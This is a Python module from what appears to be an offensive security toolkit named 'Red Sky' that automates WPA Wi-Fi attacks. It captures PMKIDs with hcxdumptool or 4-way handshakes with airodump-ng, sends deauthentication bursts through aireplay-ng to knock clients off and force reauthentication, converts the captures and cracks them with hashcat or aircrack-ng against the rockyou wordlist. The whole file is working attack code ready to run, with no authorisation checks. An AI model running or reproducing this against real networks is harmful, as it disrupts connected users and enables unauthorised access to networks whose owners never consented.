# language: Python, file: Program/wireless/handshake.py, target: Red Sky wireless — WPA handshake / PMKID
# Two capture paths:
#   1. PMKID (hcxdumptool) — clientless, single frame from the AP. Fastest path
#      when the AP is vulnerable. Produces a hashcat 22000 hash.
#   2. 4-way handshake (airodump-ng + deauth to force reauth) — classic.
# Then a crack wrapper that shells out to hashcat (GPU) or aircrack-ng (CPU).

import glob
import os
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


WL_DIR = OUTPUT_DIR / "wireless"
CAP_DIR = WL_DIR / "captures"
CAP_DIR.mkdir(parents=True, exist_ok=True)


def _which(cmd: str) -> Optional[str]:
    return shutil.which(cmd)


def _run(args: List[str], timeout: int = 120) -> int:
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
        if r.returncode != 0 and r.stderr:
            print_warn(r.stderr.strip()[:300])
        return r.returncode
    except FileNotFoundError:
        print_err("missing: " + args[0])
        return 127
    except subprocess.TimeoutExpired:
        print_warn("timeout: " + " ".join(args[:2]))
        return 124


# ── PMKID capture via hcxdumptool ──
def capture_pmkid(iface: str, bssid: str, duration: int) -> Optional[Path]:
    hcx = _which("hcxdumptool")
    if not hcx:
        print_warn("hcxdumptool missing — apt install hcxdumptool")
        return None

    out = CAP_DIR / ("pmkid_" + bssid.replace(":", "") + "_" + str(int(time.time())) + ".pcapng")
    print_info("capturing PMKID for " + str(duration) + "s -> " + str(out))
    cmd = [hcx, "-i", iface, "-o", str(out), "--enable_status=15"]
    if bssid:
        # filter to a specific BSSID
        f = CAP_DIR / "bssid_filter.txt"
        f.write_text(bssid.lower() + "\n")
        cmd += ["--filterlist_ap=" + str(f), "--filtermode=2"]

    try:
        proc = subprocess.Popen(cmd)
        time.sleep(duration)
        proc.send_signal(signal.SIGINT)
        try:
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            proc.kill()
    except FileNotFoundError:
        return None

    if out.exists() and out.stat().st_size > 0:
        print_ok("capture written " + str(out))
        return out
    print_warn("no PMKID captured (AP may be patched / not vulnerable)")
    return None


def convert_hcxtools(pcapng: Path) -> Optional[Path]:
    """hcxdumptool output -> hashcat 22000 format via hcxpcapngtool."""
    conv = _which("hcxpcapngtool")
    if not conv:
        print_warn("hcxpcapngtool missing — apt install hcxtools")
        return None
    out = pcapng.with_suffix(".22000")
    rc = _run([conv, "-o", str(out), str(pcapng)], timeout=60)
    if rc == 0 and out.exists():
        print_ok("converted -> " + str(out))
        return out
    print_warn("conversion failed")
    return None


# ── 4-way handshake via airodump-ng ──
def capture_handshake(iface: str, bssid: str, channel: int, duration: int) -> Optional[Path]:
    airodump = _which("airodump-ng")
    aireplay = _which("aireplay-ng")
    if not airodump:
        print_warn("airodump-ng missing — apt install aircrack-ng")
        return None

    prefix = "hs_" + bssid.replace(":", "") + "_" + str(int(time.time()))
    out_path = CAP_DIR / prefix

    print_info("airodump-ng on " + bssid + " ch " + str(channel) + " for " + str(duration) + "s")
    cmd = [airodump, "--bssid", bssid, "-c", str(channel),
           "--write", str(out_path), "--output-format", "cap",
           "--ignore-negative-one", iface]
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # give the AP a moment, then force a deauth to trigger reauth
    time.sleep(5)
    if aireplay:
        print_info("deauth burst to force handshake")
        _run([aireplay, "--deauth", "5", "-a", bssid, iface], timeout=20)

    time.sleep(duration)
    proc.send_signal(signal.SIGINT)
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        proc.kill()

    caps = list(CAP_DIR.glob(prefix + "*.cap"))
    if not caps:
        print_warn("no .cap written")
        return None

    # check if the handshake is actually in there
    cap = caps[0]
    if _handshake_present(cap):
        print_ok("handshake captured -> " + str(cap))
        return cap
    print_warn("no handshake in the capture — try again with more deauth or a closer position")
    return cap


def _handshake_present(cap: Path) -> bool:
    aircrack = _which("aircrack-ng")
    if not aircrack:
        return False
    try:
        r = subprocess.run([aircrack, str(cap)], capture_output=True, text=True, timeout=60)
        out = r.stdout + r.stderr
        return "1 handshake" in out or "handshake" in out.lower() and "no handshake" not in out.lower()
    except Exception:
        return False


# ── crack ──
def crack_22000(hash_file: Path, wordlist: str, rules: str) -> int:
    hashcat = _which("hashcat")
    if not hashcat:
        print_warn("hashcat missing — apt install hashcat")
        return 127
    cmd = [hashcat, "-m", "22000", str(hash_file), wordlist]
    if rules:
        cmd += ["-r", rules]
    cmd += ["--force", "--status", "--status-timer", "10"]
    print_info(" ".join(cmd))
    return _run(cmd, timeout=3600)


def crack_cap(cap: Path, wordlist: str, bssid: str) -> int:
    aircrack = _which("aircrack-ng")
    if not aircrack:
        print_warn("aircrack-ng missing")
        return 127
    cmd = [aircrack, "-w", wordlist]
    if bssid:
        cmd += ["-b", bssid]
    cmd += [str(cap)]
    print_info(" ".join(cmd))
    return _run(cmd, timeout=3600)


def cmd_capture(iface: str, bssid: str, channel: int, duration: int, mode: str) -> int:
    if not iface or not bssid:
        print_err("need --iface and --bssid")
        return 2

    bssid = bssid.lower()
    cap: Optional[Path] = None

    if mode in ("pmkid", "both"):
        p = capture_pmkid(iface, bssid, duration)
        if p:
            hash22000 = convert_hcxtools(p)
            if hash22000:
                print()
                print_ok("ready to crack: " + str(hash22000))
                print_info("redsky wireless handshake crack --hash " + str(hash22000) + " --wordlist /usr/share/wordlists/rockyou.txt")

    if mode in ("handshake", "both"):
        cap = capture_handshake(iface, bssid, channel, duration)
        if cap:
            print()
            print_info("crack with: redsky wireless handshake crack --cap " + str(cap) + " --wordlist /usr/share/wordlists/rockyou.txt --bssid " + bssid)

    if not cap and mode == "handshake":
        return 1
    return 0


def cmd_crack(hash_file: str, cap_file: str, wordlist: str, rules: str, bssid: str) -> int:
    if not wordlist:
        wordlist = "/usr/share/wordlists/rockyou.txt"
    if not Path(wordlist).exists():
        print_err("wordlist not found: " + wordlist)
        return 2

    if hash_file:
        return crack_22000(Path(hash_file), wordlist, rules)
    if cap_file:
        return crack_cap(Path(cap_file), wordlist, bssid)
    print_err("need --hash <file.22000> or --cap <file.cap>")
    return 2


def cmd_list() -> int:
    caps = sorted(CAP_DIR.glob("*"))
    if not caps:
        print_info("no captures yet")
        return 0
    for c in caps:
        sz = c.stat().st_size
        print("  " + BONE + c.name + RESET + "  " + ASH + str(sz) + " bytes" + RESET)
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky wireless handshake", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="capture", choices=["capture", "crack", "list"])
    p.add_argument("--iface", default="")
    p.add_argument("--bssid", default="")
    p.add_argument("--channel", type=int, default=1)
    p.add_argument("--duration", type=int, default=60)
    p.add_argument("--mode", default="both", choices=["pmkid", "handshake", "both"])
    p.add_argument("--hash", default="", help=".22000 hash file for crack")
    p.add_argument("--cap", default="", help=".cap file for crack")
    p.add_argument("--wordlist", default="/usr/share/wordlists/rockyou.txt")
    p.add_argument("--rules", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky wireless handshake capture --iface wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6")
        print_err("       redsky wireless handshake crack --hash file.22000 --wordlist rockyou.txt")
        print_err("       redsky wireless handshake crack --cap file.cap --bssid AA:BB:CC:DD:EE:FF")
        return 2

    if ns.help:
        print_info("capture --iface <mon> --bssid <mac> [--channel N] [--duration S] [--mode pmkid|handshake|both]")
        print_info("crack   --hash <file.22000> | --cap <file.cap> --wordlist rockyou.txt [--rules best64.rule]")
        print_info("list    -- show every capture in Output/wireless/captures/")
        return 0

    if ns.action == "list":
        return cmd_list()
    if ns.action == "crack":
        return cmd_crack(ns.hash, ns.cap, ns.wordlist, ns.rules, ns.bssid)
    return cmd_capture(ns.iface, ns.bssid, ns.channel, ns.duration, ns.mode)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
